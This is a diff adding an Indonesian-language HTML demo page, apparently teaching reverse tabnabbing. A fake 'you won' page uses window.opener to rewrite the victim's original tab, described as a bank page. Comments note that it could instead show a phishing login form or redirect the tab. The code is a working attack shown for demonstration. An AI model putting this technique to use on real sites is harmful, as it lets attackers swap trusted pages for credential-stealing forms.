@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <title>WEBSITE HADIAH (JAHAT)</title>
+    <style>
+        body { background-color: #fee2e2; font-family: sans-serif; padding: 50px; text-align: center; }
+        h1 { color: #b91c1c; }
+    </style>
+</head>
+<body>
+    <h1>SELAMAT! ANDA MENANG!</h1>
+    <p>Silakan lihat tab sebelah kiri (Tab Bank Anda)...</p>
+    <p>Kami baru saja membajaknya!</p>
+
+    <script>
+        // INI ADALAH SCRIPT JAHATNYA
+        // Script ini mengecek apakah ada halaman pembuka (opener)
+        if (window.opener) {
+            // Ubah URL halaman ASAL (korban.html) ke halaman lain
+            // Di dunia nyata, ini akan diarahkan ke halaman Login Palsu (Phishing)
+            window.opener.document.body.innerHTML = `
+                <div style="background:red; color:white; height:100vh; display:flex; justify-content:center; align-items:center; flex-direction:column;">
+                    <h1 style="font-size:50px">! ANDA TELAH DI-HACK! !</h1>
+                    <p>Halaman ini telah dikontrol oleh Website Jahat.</p>
+	   <input></input>
+                    <p>Bayangkan jika ini adalah form Login Palsu yang meminta password Anda.</p>
+                </div>
+            `;
+            
+            // Atau bisa redirect total:
+            // window.opener.location = "https://google.com";
+        }
+    </script>
+</body>
+</html>
